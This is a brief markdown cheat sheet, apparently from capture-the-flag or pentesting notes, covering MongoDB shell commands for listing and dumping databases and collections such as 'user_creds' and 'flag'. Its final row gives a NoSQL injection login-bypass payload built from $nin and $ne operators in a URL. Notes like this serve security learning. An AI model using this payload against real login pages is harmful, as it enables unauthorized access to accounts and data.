---
description: MongoDB, Redis, RavenDB, etc.
---

# NoSQL Basics

| Command                                                            | Description                                                       |
| ------------------------------------------------------------------ | ----------------------------------------------------------------- |
| `show dbs;`                                                        | List all the databases present                                    |
| `use user_creds;`                                                  | Switch to database named "user\_creds"                            |
| `show collections;`                                                | List out the collections in a database                            |
| `db.flag.find().pretty()`                                          | Dump the contents of the documents present in the flag collection |
| `http://url?login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto` | Basic NoSQLi Login                                                |
